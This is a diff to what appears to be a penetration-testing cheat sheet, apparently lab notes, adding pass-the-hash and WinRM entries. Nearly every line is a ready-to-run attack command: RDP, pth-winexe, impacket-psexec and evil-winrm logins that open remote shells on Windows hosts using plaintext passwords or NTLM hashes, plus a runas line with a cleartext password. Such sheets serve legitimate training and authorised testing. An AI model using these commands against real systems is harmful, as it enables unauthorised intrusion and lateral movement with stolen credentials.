@@ -261,12 +261,13 @@ rdesktop -E -r clipboard:CLIPBOARD -u eric -p sup3rs3cr3t 10.11.1.1
 xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8 /u:administrator /v:10.11.1.1
 xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8 /u:administrator /pth:cb2d5be3c78be06d47b697468ad3b33b /v:10.11.1.1
 
-# Winexe/Psexec/Smb
+# Pth Winexe/Psexec/Smb
 pth-winexe -U tomahawk%00000000000000000000000000000000:AB730EFA31140CE6A9262841E4109C95 //10.1.1.248 cmd.exe
 impacket-psexec -hashes 00000000000000000000000000000000:AB730EFA31140CE6A9262841E4109C95 tomahawk@10.1.1.248
 
-# evil-winrm
+# WinRm (port 5985,5986)
 evil-winrm -i 10.11.1.1 -u john -p easyas123
+evil-winrm -i 10.11.1.1 -u john -H AB730EFA31140CE6A9262841E4109C95
 
 # Runas another user
 runas /env /noprofile /user:tomahawk RibSt3ak69 "%SystemRoot%\system32\cmd.exe"
